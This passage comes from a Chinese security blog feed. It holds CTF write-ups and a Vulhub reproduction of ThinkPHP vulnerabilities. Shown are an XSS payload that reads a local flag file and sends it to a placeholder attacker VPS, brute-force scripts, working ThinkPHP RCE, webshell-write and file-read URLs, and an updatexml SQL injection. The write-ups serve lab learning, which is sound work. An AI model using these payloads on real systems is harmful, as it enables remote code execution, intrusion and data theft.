class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(kind == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">kind = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>切换颜色请求的是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;catweb.zajebistyc.tf&#x2F;cats?kind&#x3D;</span><br></pre></td></tr></table></figure><p>返回的结果都会被嵌入到网页中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newDiv.innerHTML = &#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;max-width: 200px; max-height: 200px&quot;</span> <span class="attr">src</span>=<span class="string">&quot;static/&#x27;+kind+&#x27;/&#x27;+cat+&#x27;&quot;</span> /&gt;</span>&#x27;;</span><br></pre></td></tr></table></figure><p>试着弹个框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?&quot;,&quot;content&quot;:[&quot;\&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&quot;],&quot;status&quot;:&quot;ok&quot;,&quot;a&quot;:&quot;</span><br></pre></td></tr></table></figure><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319222908.png" style="zoom:80%;"><p>分析一下，可以看到这里遍历了content的内容</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200319230144.png"></p><p>看下注入后的源码，发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>从里面逃逸出来了，这是因为我们用<code>\&quot;&gt;</code>将前面闭合了</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319231116.png" style="zoom:80%;"><p>因此我们可以构造如下payload进行json注入:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;, &quot;content&quot;: [&quot;\&quot;&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;youvps.com&#x2F;xss.js&#39;&gt;&lt;&#x2F;script&gt;&quot;], &quot;status&quot;: &quot;ok&quot;, &quot;a&quot;: &quot;</span><br></pre></td></tr></table></figure><p>交给服务端，xss.js写的是，利用的就是那个CVE</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&#x27;file:///app/templates/flag.txt&#x27;</span>).then(<span class="function"><span class="params">response</span> =&gt;</span> response.text()).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;<span class="built_in">window</span>.location = <span class="string">&#x27;https://yourvps/?a=&#x27;</span> + (btoa(response) || <span class="string">&#x27;No Value&#x27;</span>)&#125;);</span><br></pre></td></tr></table></figure><p>额案后我们向服务端report，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;app&#x2F;templates&#x2F;index.html?&quot;, &quot;content&quot;: [&quot;\&quot;&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;yourvps&#x2F;xss.js&#39;&gt;&lt;&#x2F;script&gt;&quot;], &quot;status&quot;: &quot;ok&quot;, &quot;a&quot;: &quot;</span><br></pre></td></tr></table></figure><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319213940.png" style="zoom:80%;"><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="Hidden-Flag"><a href="#Hidden-Flag" class="headerlink" title="Hidden Flag"></a>Hidden Flag</h4><p>题目提示flag类似于<code>p4&#123;letters_digits_and_special_characters&#125;</code></p><p>打开题目搜了搜发现是Yara</p><p>参考：<a href="https://bbs.pediy.com/thread-226011.htm">https://bbs.pediy.com/thread-226011.htm</a></p><p>因此我们可以构造下面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rule GambitWildcard</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       $hex_string &#x3D; &#123; 70 34 7B &#125;</span><br><span class="line"> </span><br><span class="line">    condition:</span><br><span class="line">       $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200318233751.png"></p><p>发现匹配到flag了，因此我们可以尝试爆破flag，自己写的烂exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url1=<span class="string">&quot;http://hidden.zajebistyc.tf/api/query/medium&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://hidden.zajebistyc.tf/api/matches/&#123;&#125;?offset=0&amp;limit=50&quot;</span></span><br><span class="line">proxies=&#123;<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>,<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">tr=string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=utf-8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://hidden.zajebistyc.tf&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;__cfduid=ddf850d29ca9e31ba29e0e9bf15986bd01584235270&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">flag=<span class="string">&quot;p4&#123;ind3x1ng-l3ak5&#125;&quot;</span></span><br><span class="line"><span class="comment"># data=r&#x27;&#x27;&#x27;&#123;&quot;raw_yara\&quot;:\&quot;rule ASCIIFatTony\\n\&#123;\\n    strings:\\n        $a = \&#123;&#123;&#125;\&#125;\\n \\n    condition:\\n       \$a\\n\&#125;\&quot;,\&quot;method\&quot;:\&quot;query\&quot;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span>(<span class="params">s,flag</span>):</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s1=<span class="string">&#x27; &#x27;</span>+hex(ord(s)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">data1 = <span class="string">&#x27;&#x27;&#x27;&#123;&quot;raw_yara&quot;:&quot;rule ASCIIFatTony\\n&#123;\\n    strings:\\n        $a = &#123;70 34 7b 69 6e 64 33 78 31 6e 67 2d 6c 33 61 6b 35&#x27;&#x27;&#x27;</span>+s1+<span class="string">&#x27;&#x27;&#x27;&#125;\\n \\n    condition:\\n       $a\\n&#125;&quot;,&quot;method&quot;:&quot;query&quot;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print(data1)</span></span><br><span class="line">r=requests.post(url1,data=data1,headers=headers,proxies=proxies)</span><br><span class="line">key=re.match(<span class="string">r&quot;\&#123;\&quot;query_hash\&quot;:\&quot;(.+)\&quot;\&#125;&quot;</span>,r.text).group(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">url3=url2.format(key)</span><br><span class="line">r=requests.get(url3,headers=headers,proxies=proxies)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;/opt/bin/getflag&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">print(<span class="string">&quot;[+] find!!!&quot;</span>)</span><br><span class="line">flag=flag+s</span><br><span class="line">print(s+<span class="string">&quot;   &quot;</span>+hex(ord(s)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tr:</span><br><span class="line">threading.Thread(target=getflag,args=(i,flag,)).start()</span><br></pre></td></tr></table></figure><h2 id="SuSec-CTF"><a href="#SuSec-CTF" class="headerlink" title="SuSec CTF"></a>SuSec CTF</h2><h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h3><h4 id="Secure-note"><a href="#Secure-note" class="headerlink" title="Secure note"></a>Secure note</h4><p>题目的意思是我们可以curl的放式来完成请求</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200320212641.png"></p><p>我们找到admin用户，查看他的note</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200320212845.png" style="zoom:80%;"><p>发现好像是有规律的，第一时间想到了爆破</p><p>我们可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xkva&#123;1&#125;&#123;2&#125;rqXd6tZvr&#123;3&#125;</span><br></pre></td></tr></table></figure><p>1位置应该在w-4之间，3位置在H-T之间，exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">proxies &#x3D; &#123;</span><br><span class="line">  &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def req(url):</span><br><span class="line">print(url)</span><br><span class="line">try:</span><br><span class="line">r&#x3D;requests.get(url)</span><br><span class="line">if r.status_code&#x3D;&#x3D;200:</span><br><span class="line">print(r.text)</span><br><span class="line">exit(0)</span><br><span class="line">except Exception as e:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;69.90.132.70:1339&#x2F;paste&#x2F;Xkva&#123;&#125;&#123;&#125;rqXd6tZvr&#123;&#125;&quot;</span><br><span class="line">tr&#x3D;string.digits+string.ascii_letters</span><br><span class="line">li&#x3D;[]</span><br><span class="line">for i in &#39;01234&#39;:</span><br><span class="line">for j in tr:</span><br><span class="line">for k in &#39;IJKLMNOPQRST&#39;:</span><br><span class="line">li.append(url.format(i,j,k))</span><br><span class="line">p &#x3D; ThreadPoolExecutor(3)</span><br><span class="line">for u in li:</span><br><span class="line">p.submit(req,u)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后跑出来是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xkva2arqXd6tZvrP</span><br></pre></td></tr></table></figure><h4 id="Little"><a href="#Little" class="headerlink" title="Little"></a>Little</h4><p>这题差点就弄出来了</p><p>binwalk 分离出 secondf.png 和 0.ext，得到<code>tO_7h3_3nd_Of_</code>:</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2.png" alt="img"></p><p>little.img 文件用 DiskGenius 打开得到 FIRSTF.KGB</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/3.png" alt="img"></p><p>再用 KGB Archiver 提取 FIRSTF.KGB 得到 firstf.ogg，播放声音是 <code>c0me_wi4h_f4t_m4n_</code></p><p>flag应该还有一段</p><p>用Autopsy查看以下删除的数据，新建一个实例</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319001419.png" style="zoom:80%;"> <p>选择工作目录，随意选择就行，下一步，然后完成</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319001525.png" style="zoom:80%;"><p>Add Data Source添加little.img，选择Unallocated Space Image File</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319001924.png" style="zoom:80%;"><p>然后下一步下一步，完成就行，看到MP4右键导出</p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM截图20200319002143.png" style="zoom:80%;"><p>播放发现第三段</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200319002446.png"></p><p>拼接到一起就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUSEC&#123;c0me_wi4h_f4t_m4n_t0_7h3_3nd_0f_t4i3_sUsEc_journey&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://www.gtfly.top/2020/03/16/2020-ConfidenceCTF-wp/">http://www.gtfly.top/2020/03/16/2020-ConfidenceCTF-wp/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> ctftime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub之thinkphp</title>
      <link href="2020/03/07/Vulhub%E4%B9%8Bthinkphp/"/>
      <url>2020/03/07/Vulhub%E4%B9%8Bthinkphp/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要复现了Vulhub上thinkphp相关内容！</p><a id="more"></a><h2 id="2-X-RCE"><a href="#2-X-RCE" class="headerlink" title="2.X RCE"></a>2.X RCE</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在ThinkPHP ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.$depr.<span class="string">&#x27;([^&#x27;</span>.$depr.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode($depr,$paths));</span><br></pre></td></tr></table></figure><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>详细内容参见：<a href="https://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">https://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p><p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p><p>先介绍一下TP的路由规则</p><p>URL访问模式,可选参数0、1、2、3,代表以下四种模式：</p><ul><li>0 (普通模式)</li><li>1 (PATHINFO 模式) -&gt;默认使用</li><li>2 (REWRITE  模式)</li><li>3 (兼容模式)</li></ul><p>PATHINFO 模式还分为3种规则,使用数字1、2、3代表以下三种模式:</p><ul><li>1 普通模式(参数没有顺序,例如<code>/m/module/a/action/id/1</code>)</li><li>2 智能模式(系统默认使用的模式，可自动识别模块和操作<code>/module/action/id/1/</code> 或者 <code>/module,action,id,1/</code>…)</li><li>3 兼容模式(通过一个GET变量将PATHINFO传递给dispather，默认为s，例如<code>index.php?s=/module/action/id/1</code>)</li></ul><p>这些东西在<code>ThinkPHP/Common/convention.php</code>中定义的有</p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200311232407.png" style="zoom:80%;"><p>漏洞出现的位置位于<code>ThinkPHP/Lib/Think/UtilDispatcher.class.php</code></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200311233959.png" style="zoom:80%;"><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们可以构造没有的路由规则来rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?s=a/b/c/$&#123;phpinfo()&#125;</span><br><span class="line">s=a/b/c/$&#123;<span class="keyword">eval</span>($_POST[<span class="number">1</span>])&#125;</span><br><span class="line">?s=a/b/c/$&#123;@<span class="keyword">print</span>(<span class="keyword">eval</span>($_POST[<span class="number">1</span>]))&#125;</span><br></pre></td></tr></table></figure><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200312234457.png" style="zoom:80%;"><h2 id="5-0-23-RCE"><a href="#5-0-23-RCE" class="headerlink" title="5.0.23 RCE"></a>5.0.23 RCE</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>由于没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p><p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>漏洞位于<code>thinkphp/library/think/Request.php</code></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200312235306.png" style="zoom:80%;"><p>可以看到通过外部传入<code>Config::get(&#39;var_method&#39;)</code>可以造成该类的任意方法调用</p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200316231420.png" style="zoom: 80%;"><p>这里我们又可以将类属性进行替换</p><p>啊 太难了 先挖好坑！。。。。。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>我们最终构造的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=captcha</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">POST1：_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br><span class="line">POST2：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br><span class="line"></span><br><span class="line"><span class="comment">#任意文件包含</span></span><br><span class="line">POST: _method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/etc/passwd</span><br></pre></td></tr></table></figure><p><strong>命令执行1：</strong></p><p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM%E6%88%AA%E5%9B%BE20200316232827.png"></p><p><strong>命令执行2：</strong></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200316232700.png" style="zoom:80%;"><p><strong>任意文件读取：</strong></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM截图20200316232546.png" style="zoom:80%;"><h2 id="5-rce"><a href="#5-rce" class="headerlink" title="5-rce"></a>5-rce</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/9113969-11a5b23a7c4f0a75.png" style="zoom:80%;"><p>影响范围</p><blockquote><p>5.x &lt; 5.1.31<br>5.x &lt;= 5.0.23</p></blockquote><p>漏洞点在<code>library/think/route/dispatch/Module.php</code></p><p>留个坑</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>5.1.x php版本&gt;5.5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>5.0.x php版本&gt;=5.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span></span><br><span class="line">http:<span class="comment">//your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">/thinkphp/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br><span class="line"></span><br><span class="line">/thinkphp/public/?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1</span><br><span class="line"></span><br><span class="line">/thinkphp/<span class="keyword">public</span>/?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">system</span>&amp;<span class="title">vars</span>=<span class="title">dir</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/<span class="title">thinkphp</span>/<span class="title">public</span>/?<span class="title">s</span>=<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">system</span>&amp;<span class="title">return_value</span>=&amp;<span class="title">command</span>=<span class="title">dir</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">/thinkphp/public/?s=index/\think\app/invokefunction&amp;function=system&amp;vars[0]=dir&amp;vars[1][]=</span><br><span class="line"></span><br><span class="line">/thinkphp/<span class="keyword">public</span>/index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM%E6%88%AA%E5%9B%BE20200318230505.png"></p><h2 id="in-sqlinjection"><a href="#in-sqlinjection" class="headerlink" title="in-sqlinjection"></a>in-sqlinjection</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>要求要开启DEBUG模式</p><p>Tp官方版本5.0.9默认依旧是开放着调试模式</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>可以爆出数据库账号密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ids[<span class="number">0</span>,updatexml(<span class="number">0</span>,concat(<span class="number">0xa</span>,user()),<span class="number">0</span>)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM%E6%88%AA%E5%9B%BE20200318231831.png"></p><p>参考：</p><p><a href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/">https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/</a></p><p><a href="https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><p><a href="https://xz.aliyun.com/t/125">https://xz.aliyun.com/t/125</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
            <tag> vulhub </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhub之phpmyadmin</title>
      <link href="2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/"/>
      <url>2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/</url>
      
